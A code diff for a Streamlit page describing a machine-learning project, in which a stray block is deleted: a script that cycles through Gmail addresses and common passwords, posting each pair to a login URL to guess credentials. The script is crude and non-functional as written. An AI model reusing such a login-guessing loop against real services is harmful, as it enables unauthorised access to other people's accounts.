@@ -175,42 +175,6 @@ if input_url != "":
 else:
     st.write("")
 
-import requests
-
-# List of username and password pairs to try
-usernames = ['user1@gmail.com', 'user2@gmail.com', 'admin@gmail.com']
-passwords = ['password1', 'password2', '123456']
-
-# Target URL with a login portal (replace with the actual URL)
-login_url = "www.gmail.com"  # Replace with the actual URL
-
-# Session object to maintain the session cookies
-session = requests.Session()
-
-# Loop through the username and password pairs
-for username in usernames:
-    for password in passwords:
-        # Prepare the login data
-        login_data = {
-            'username': username,
-            'password': password
-        }
-
-        try:
-            # Send a POST request to the login URL
-            response = session.post(login_url, data=login_data)
-            response_text = response.text
-
-            # Check if the login was successful based on the response
-            if 'Login Successful' in response_text:
-                print(f"Successful login - Username: {username}, Password: {password}")
-                break
-        except requests.exceptions.RequestException as e:
-            print(f"Request failed: {str(e)}")
-
-# Close the session
-session.close()
-
 st.markdown("### *Our Approach*")
 st.markdown("To tackle this challenge, we leveraged classical machine learning techniques, including Data Exploration, Data Cleaning, Feature Engineering, Model Building, and Model Testing. Our comprehensive approach involved experimenting with different machine learning algorithms to identify the most suitable ones for this particular case.")
 st.markdown("### *Key Features*")
